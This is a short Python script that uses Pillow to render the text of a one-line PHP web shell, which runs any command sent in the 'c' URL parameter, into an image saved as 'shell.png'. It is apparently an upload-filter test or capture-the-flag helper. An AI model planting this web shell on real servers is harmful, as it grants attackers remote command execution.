import os
from PIL import Image, ImageDraw, ImageFont

img = Image.new('RGB', (700, 60), 'white')
d = ImageDraw.Draw(img)

# Try to use a monospace font, fallback gracefully with size handling
try:
    font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf', 18)
except IOError:
    # Modern Pillow allows passing size to the default font
    try:
        font = ImageFont.load_default(size=18)
    except TypeError:
        # Fallback for very old Pillow versions
        font = ImageFont.load_default()

d.text((5, 20), '<?php system($_GET["c"]); ?>', fill='black', font=font)
img.save('shell.png')
